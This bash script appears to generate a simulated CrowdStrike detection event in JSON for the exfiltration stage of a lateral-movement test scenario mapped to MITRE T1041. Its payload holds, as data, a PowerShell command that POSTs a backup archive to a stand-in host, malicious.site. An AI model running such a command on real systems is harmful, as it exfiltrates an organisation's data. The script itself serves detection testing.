#!/usr/bin/env bash
# Lateral Movement to Data Exfiltration - Stage 8: Exfiltration
# MITRE ATT&CK: T1041 - Exfiltration Over C2 Channel
# Tactic: Exfiltration
# Severity: CRITICAL

SCENARIO_NAME="lateral_to_exfil"
SCENARIO_STAGE=8
SCENARIO_STAGE_NAME="Exfiltration"
SCENARIO_SOURCE="crowdstrike"
SCENARIO_SEVERITY="CRITICAL"
SCENARIO_TACTIC="Exfiltration"
SCENARIO_TECHNIQUE="T1041"

TIMESTAMP=$(date +%s)
DETECT_ID="cs-stage8-${TIMESTAMP}"

build_payload() {
    local tenant_id="${1:-default-tenant}"
    cat <<EOF
{
    "detect_id": "${DETECT_ID}",
    "customer_id": "${tenant_id}",
    "timestamp": ${TIMESTAMP},
    "sensor": {
        "hostname": "fileserver-01"
    },
    "process": {
        "user_name": "CORP\\\\attacker",
        "file_name": "powershell.exe",
        "command_line": "Invoke-WebRequest -Uri https://malicious.site/exfil -Method POST -Body (Get-Content C:\\\\temp\\\\backup.zip -Raw)",
        "sha256": "0000000000000000000000000000000000000000000000000000000000000008"
    },
    "tactic": "${SCENARIO_TACTIC}",
    "technique": "${SCENARIO_TECHNIQUE}",
    "severity": "${SCENARIO_SEVERITY}"
}
EOF
}
